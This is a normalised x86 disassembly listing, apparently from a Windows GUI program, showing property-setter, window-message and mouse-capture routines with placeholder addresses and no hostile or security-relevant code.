cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_44462c
sub_43902c
mov cl [ eax + 0x238 ]
add cl 0xfd
sub cl 0x2
jb r-xdata
retn
cmp dl [ eax + 0x23a ]
je r-xdata
mov [ eax + 0x23a ] dl
call sub_44462c
sub_43908c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x18e
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
pop ebx
retn
sub_439150
jmp sub_403970
sub_439157
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4391f2
jmp sub_403970
sub_4391f9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_439200
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_44462c
sub_43983c
push ebx
mov ebx eax
mov eax ebx
call sub_445678
mov eax ebx
call sub_438d04
pop ebx
retn
sub_4399bc
jmp sub_403970
sub_4399c3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4399cc
push ebx
cmp [ eax + 0x25a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_439de0
jmp sub_403970
sub_439de7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439ec4
jmp sub_403970
sub_439ecb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439ed4
push ebx
cmp [ eax + 0x262 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
sub_439f40
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x193
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
pop ebx
retn
sub_43a0fc
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_43a105
jmp sub_403970
j_sub_43a0fc
jmp sub_43a0fc
sub_43a10c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a114
push ebx
mov ebx eax
mov eax ebx
call sub_4465e8
mov eax ebx
call sub_43a158
pop ebx
retn
sub_43a128
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_43a158
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_43a144
push ebx
mov ebx eax
mov eax ebx
call sub_442960
mov eax ebx
call sub_43a158
pop ebx
retn
sub_43a230
jmp sub_403970
sub_43a237
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a270
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
call sub_44462c
sub_43a284
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
test dl dl
je r-xdata
call sub_43a158
sub_43a29c
cmp dl [ eax + 0x20a ]
je r-xdata
retn
mov [ eax + 0x20a ] dl
call sub_44462c
sub_43a2b0
mov [ eax + 0x20c ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_41fc0c
sub_43a2c4
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44462c
sub_43a37c
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_43a3ad
jmp sub_403970
sub_43a3b4
pop ebp
retn
sub_43a3b8
sub [ rw-data ] 0x1
retn
sub_43a515
jmp sub_403970
sub_43a51c
pop ebp
retn
sub_43a520
sub [ rw-data ] 0x1
retn
sub_43a539
add eax 0xffffffe0
jmp sub_43ab20
sub_43a541
add eax 0xffffffe0
jmp sub_43ab88
sub_43a549
add eax 0xffffffe0
jmp sub_43ac9c
sub_43a551
add eax 0xffffffe0
jmp sub_43ad10
sub_43a559
add eax 0xffffffe0
jmp sub_43a7cc
sub_43a561
add eax 0xffffffe0
jmp sub_43a7e0
sub_43a569
add eax 0xffffffe0
jmp sub_43a858
sub_43a571
add eax 0xffffffe0
jmp sub_43a8fc
sub_43a579
add eax 0xffffffe0
jmp sub_43a900
sub_43a581
add eax 0xffffffe0
jmp sub_43a988
sub_43a589
add eax 0xffffffe0
jmp sub_43aad0
sub_43a591
add eax 0xffffffe0
jmp sub_43aad4
sub_43a599
add eax 0xffffffe0
jmp sub_43aaf0
sub_43a5ab
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405a70
sub_43a789
jmp sub_403970
sub_43a790
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a7cc
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403fc0
pop ebx
retn
sub_43a847
jmp sub_403970
sub_43a84e
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43a8e0
jmp sub_403970
sub_43a8e7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a8fc
mov al 0x1
retn
sub_43a97b
jmp sub_403970
sub_43a982
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43aa80
jmp sub_403970
sub_43aa87
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43aad0
mov [ eax + 0xc ] edx
retn
sub_43aad4
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_43ab78
jmp sub_403970
sub_43ab7f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ac7e
jmp sub_403970
sub_43ac85
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43acfe
jmp sub_403970
sub_43ad05
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43ad90
jmp sub_403970
sub_43ad97
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43ae8b
jmp sub_403970
sub_43ae92
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43af54
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_43aea0
call EnumWindows
retn
sub_43afe6
jmp sub_403970
sub_43afed
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43aff8
xor eax eax
retn
sub_43b0f1
jmp sub_403970
sub_43b0f8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b1e2
jmp sub_403970
sub_43b1e9
pop ebp
retn
sub_43b23e
jmp sub_403970
sub_43b245
pop ebp
retn
sub_43d19d
add eax 0xffffff8c
jmp sub_4496ec
sub_43d1a5
add eax 0xffffff8c
jmp sub_4496f0
sub_43d1ad
add eax 0xffffff8c
jmp sub_4497dc
sub_43d1b5
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_43d1c2
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_43d1cf
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_43d1dc
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_43d1e9
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_43d1f6
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_43d203
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_43d210
add eax 0xffffff8c
jmp sub_44ae4c
sub_43d222
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405a70
sub_43d684
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_43d997
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_419c4c
retn
sub_43d9b4
push 0x15
mov ecx rw-data
call sub_419c0c
retn
sub_43da4c
call GetCapture
call sub_43d784
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_43dcb0
push ebx
push eax
push sub_43de34
call sub_420c88
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_43dcc8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_43dcf8
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_420d3c
pop ebx
retn
sub_43ddd6
jmp sub_4036bc
sub_43de08
xor eax eax
retn
sub_43de0c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_43de24
retn
sub_43de28
mov eax [ rw-data ]
retn
sub_43de30
retn
sub_43de5e
jmp sub_4036bc
sub_43de63
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_460524
call sub_403a24
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43de80
call sub_403474
xor eax eax
mov [ rw-data ] eax
retn
sub_43de90
call sub_403470
xor eax eax
mov [ rw-data ] eax
retn
sub_43dea0
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403540
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_43df50
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_43df68
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_43dfb4
retn
sub_43e16c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403418
pop esi
retn
sub_43e180
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403418
pop esi
retn
sub_43e194
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_43e1a0
mov eax 0x4
retn
sub_43e1a8
retn
sub_43ed99
jmp sub_4036bc
sub_43f086
jmp sub_403970
sub_43f0f8
jmp sub_403970
sub_43f104
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_43ee2c
sub_43f283
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_423cc4
retn
sub_43f299
jmp sub_403970
sub_43f2c0
jmp sub_403970
sub_43f342
jmp sub_403970
sub_43f36a
jmp sub_403970
sub_43f371
mov esp ebp
pop ebp
retn
sub_43f429
jmp sub_403970
sub_43f480
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43f44c
mov [ ebx + 0x58 ] esi
sub_43f5d4
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_43f5e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033cc
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43f6d1
jmp sub_403970
sub_43f6d8
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43f75b
jmp sub_403970
sub_43f762
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43fb30
xor eax eax
retn
sub_43fb34
mov al [ eax + 0x58 ]
retn
sub_43fb38
xor eax eax
retn
sub_43fb3c
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_43fb44
mov eax [ eax + 0x30 ]
retn
sub_43fbe8
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_43fc94
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_43fcac
mov [ eax + 0x5d ] dl
retn
sub_43fcb0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_443890
sub_43fcc0
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_4401a3
jmp sub_403970
sub_4401aa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44020c
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_440290
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_4403ad
jmp sub_403970
sub_4403b4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4404b0
push eax
xor ecx ecx
mov edx 0xb037
call sub_441a58
retn
sub_440671
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403418
sub_440722
jmp sub_403970
sub_440729
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_440800
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_441a58
sub_440818
push 0x0
xor ecx ecx
mov edx 0xe
call sub_441a58
retn
sub_440828
push edx
mov edx 0xd
call sub_441a58
retn
sub_440834
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_440848
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_440929
jmp sub_403970
sub_440930
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440938
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_441a58
sub_4409a8
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_4409bc
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_4409c8
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_4409d0
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_441a58
sub_4409f4
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_441a58
sub_440a18
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_441a58
sub_440a60
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_440a68
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_441a58
sub_440a8c
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_441a58
sub_440ab0
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_441a58
sub_440acc
push ebx
mov ebx eax
call sub_43da4c
cmp ebx eax
sete al
pop ebx
retn
sub_440b04
push esi
mov dl 0x1
mov si 0xffce
call sub_403418
pop esi
retn
sub_440c4e
jmp sub_403970
sub_440c55
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_440d78
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_440cec
retn
sub_440dcc
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_440de0
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_440ec5
jmp sub_403970
sub_440ee4
xor eax eax
retn
sub_440ee8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_440f00
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_440f18
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_440f34
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_440f4c
retn
sub_441010
retn
sub_441014
cmp eax [ rw-data ]
sete al
retn
sub_441088
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_4411a4
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403418
pop esi
pop ebp
retn 0x4
sub_4411e4
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_44147b
jmp sub_403970
sub_441482
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44148c
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403418
pop esi
retn
sub_4414a0
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403418
pop esi
retn
sub_44176f
jmp sub_403970
sub_441818
push esi
mov si 0xffee
call sub_403418
pop esi
retn
sub_441824
mov al 0x1
retn
sub_441afc
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_43fef8
retn
sub_441b20
retn
sub_441d39
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41d458
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_441d54
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41f790
retn
sub_441e4c
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_442464
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44246c
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_442474
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44252c
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44254c
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_4409f4
mov [ ebx + 0x9a ] 0x1
sub_4425a4
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_440998
mov [ ebx + 0x56 ] 0x1
sub_4425c8
mov [ edx + 0xc ] 0x1
retn
sub_4425d0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_441a58
sub_4425e8
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_441a58
sub_442600
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_442866
jmp sub_403970
sub_44286d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442898
mov eax [ r-xdata ]
retn
sub_442a34
jmp sub_403970
sub_442a3b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442b5c
mov eax [ eax + 0xb8 ]
retn
sub_442bc4
push ebx
mov ebx eax
mov eax ebx
call sub_440ee8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_442be0
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_442d78
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_442da8
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_442db0
call sub_43f964
retn
sub_442eb0
jmp sub_403970
sub_443070
jmp sub_403970
sub_4430c0
jmp sub_403970
sub_4430f8
retn
sub_443381
jmp sub_403970
sub_443509
jmp sub_403970
sub_44386b
jmp sub_403970
sub_443917
jmp sub_403970
sub_443924
inc [ eax + 0x160 ]
retn
sub_44392c
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_44394c
sub_44394c
xor edx edx
call sub_443890
retn
sub_443a19
jmp sub_403970
sub_443a20
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_443b0f
jmp sub_403970
sub_444036
jmp sub_403970
sub_44403d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444205
jmp sub_403970
sub_44420c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4442e0
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_4444cd
jmp sub_403970
sub_4444d4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_4445c4
xor eax eax
retn
sub_44462c
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_441a58
sub_44475a
jmp sub_4036bc
sub_44488f
jmp sub_403970
sub_444896
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4448a0
jmp sub_4036bc
sub_4448a5
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_460524
call sub_403a24
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444e60
jmp sub_403970
sub_444e67
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444e70
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_44536e
jmp sub_403970
sub_4453c0
push ebx
mov ebx eax
call sub_42250c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_441a58
pop ebx
retn
sub_4453dc
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_441a58
retn
sub_4453f0
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_441a58
retn
sub_445400
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_441a58
retn
sub_4456ac
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4473d4
pop esi
retn
sub_4457c0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_445810
pop esi
retn
sub_4457d4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4458fc
pop esi
retn
sub_4457e8
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4457fc
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4458ef
jmp sub_403970
sub_4458f6
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445986
jmp sub_403970
sub_44598d
pop ebx
pop ecx
pop ebp
retn
sub_445994
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_4459a4
retn
sub_4459a8
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_4459c8
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_445b28
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_445bf8
retn
sub_445d10
jmp sub_403970
sub_445d17
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445de2
jmp sub_403970
sub_445e0c
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_445e9e
jmp sub_403970
sub_446070
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_446314
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_4463f0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_443e1c
pop esi
retn
sub_4464b4
push esi
mov si 0xffc1
call sub_403418
pop esi
retn
sub_4464e0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4464f4
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_446508
call sub_443ddc
retn
sub_446510
call sub_443ddc
retn
sub_446518
call sub_443ddc
retn
sub_4465c0
push ebx
mov ebx eax
mov eax ebx
call sub_442474
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_423684
mov dx 0xb009
mov eax ebx
call sub_443e1c
pop ebx
retn
sub_446724
call sub_443ddc
retn
sub_44672c
call sub_443ddc
retn
sub_446734
call sub_443ddc
retn
sub_44673c
call sub_443ddc
retn
sub_4467a0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_446c36
jmp sub_403970
sub_446c3d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446d1c
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_446ec0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
mov eax [ eax + 0x190 ]
retn
mov eax edx
call sub_4470c4
retn
sub_446ed8
jmp r-xdata
mov edx [ eax + 0x30 ]
test edx edx
jne r-xdata
mov eax edx
mov edx [ eax + 0x190 ]
test edx edx
jne r-xdata
mov eax edx
retn
call sub_4470c4
mov edx eax
sub_446ef8
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_441a58
retn
sub_446f98
push ebx
mov ebx eax
mov eax ebx
call sub_4473c8
test al al
